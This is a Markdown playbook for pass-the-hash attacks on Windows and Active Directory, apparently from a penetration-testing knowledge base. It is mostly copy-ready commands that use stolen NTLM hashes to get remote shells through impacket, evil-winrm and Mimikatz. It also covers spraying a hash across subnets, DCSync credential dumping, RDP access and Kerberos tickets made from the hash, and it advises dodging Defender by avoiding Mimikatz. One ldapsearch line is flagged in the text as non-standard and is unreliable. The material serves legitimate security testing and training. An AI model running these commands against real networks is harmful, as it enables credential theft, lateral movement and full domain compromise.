# Password Attacks — Pass-the-Hash (PtH)

## When this applies

- You have an NTLM hash (from Mimikatz, secretsdump, captured NetNTLMv2 cracking, etc.).
- NTLM authentication is enabled on the target.
- Goal: authenticate to remote services (SMB, WMI, LDAP, MSSQL, WinRM) without cracking the hash to plaintext.

## Technique

NTLM authentication uses the hash directly during the challenge-response (the protocol never needs the plaintext). Tools accept `:<NThash>` in place of a password — same network protocol behavior, no cracking required.

## Steps

### 1. Verify hash format

NT hash is 32 hex characters (output of NT one-way function on UTF-16-LE password). Format examples:

```
LMHASH:NTHASH       e.g. aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
:NTHASH             e.g. :8846f7eaee8fb117ad06bdd830b7586c   (LM=NULL is fine)
```

### 2. impacket — psexec / wmiexec / smbexec

```bash
# psexec.py — interactive shell as Administrator
psexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@target.com

# wmiexec.py — semi-interactive (less noisy)
wmiexec.py -hashes :NTHASH administrator@target.com

# smbexec.py — alternative method
smbexec.py -hashes :NTHASH administrator@target.com
```

### 3. CrackMapExec / NetExec

```bash
# Test hash against single host
crackmapexec smb target.com -u administrator -H NTHASH

# Test against subnet
crackmapexec smb 192.168.1.0/24 -u administrator -H NTHASH

# Run command
crackmapexec smb target.com -u administrator -H NTHASH -x "whoami"

# Spray across hosts
crackmapexec smb hosts.txt -u administrator -H NTHASH --continue-on-success
```

### 4. evil-winrm — interactive WinRM shell

```bash
evil-winrm -i target.com -u administrator -H NTHASH
```

Requires WinRM (port 5985) enabled.

### 5. Mimikatz Pass-the-Hash (Windows attacker host)

```powershell
sekurlsa::pth /user:administrator /domain:domain.com /ntlm:NTHASH /run:cmd.exe
# Spawns a new cmd.exe with the hash injected; subsequent commands run as the target user
dir \\target\c$
psexec \\target cmd
```

### 6. SMB enumeration with hash

```bash
smbclient.py -hashes :NTHASH domain/administrator@target
smbmap -H target -u administrator -p ':NTHASH'
```

### 7. LDAP / AD operations with hash

```bash
# nxc / impacket
ldapsearch -H ldap://target -D "administrator@domain" -W <NTHASH>      # not standard

# Use bloodyAD with NTLM hash
bloodyAD --host target --domain domain.com -u administrator -p :NTHASH set password ...

# Impacket secretsdump for DCSync
secretsdump.py -hashes :NTHASH domain/administrator@DC_IP -just-dc-user administrator
```

### 8. MSSQL with hash

```bash
mssqlclient.py -hashes :NTHASH domain/administrator@target
```

### 9. RDP with hash (restricted admin mode)

```bash
xfreerdp /v:target /u:administrator /pth:NTHASH
```

Requires RestrictedAdmin mode enabled on target (registry: `DisableRestrictedAdmin = 0`).

### 10. Detect when NTLM is disabled

Symptoms:
- `STATUS_NOT_SUPPORTED` errors on SMB/WinRM/LDAP.
- "NTLM authentication has been disabled" in event logs.
- Modern Kerberos-only domains.

If NTLM disabled → switch to Kerberos with the hash via `impacket -k`:

```bash
# Bootstrap krb5.conf, get TGT from hash:
getTGT.py -hashes :NTHASH domain.com/administrator
export KRB5CCNAME=$PWD/administrator.ccache
psexec.py -k -no-pass administrator@target.com
```

See `system/scenarios/ad/kerberos-only-domain.md`.

## Verifying success

- Tool returns shell / output (e.g. `whoami` returns target user).
- SMB share listing succeeds (`smbmap -H target ...`).
- DCSync works for the hashed user.

## Common pitfalls

- NTLM disabled domain-wide — switch to Kerberos with `-k -no-pass`.
- Restricted Admin mode required for RDP PtH — registry-controlled.
- Account requires Protected Users group — NTLM auth is rejected for them.
- Defender flags Mimikatz; use impacket from Linux instead.
- Some hosts only allow specific authentication methods (Kerberos-only via group policy).

## Tools

- Impacket suite (psexec.py, wmiexec.py, smbexec.py, smbclient.py, secretsdump.py).
- CrackMapExec / NetExec (bulk testing).
- evil-winrm (interactive WinRM).
- Mimikatz `sekurlsa::pth` (Windows attacker host).
- xfreerdp (`/pth:`).

## References

- MITRE ATT&CK T1550.002 (Pass the Hash).
- CWE-294 (Authentication Bypass by Capture-replay).
- See `system/scenarios/ad/pass-the-hash.md` for AD-specific PtH.
- Microsoft mitigations: https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/
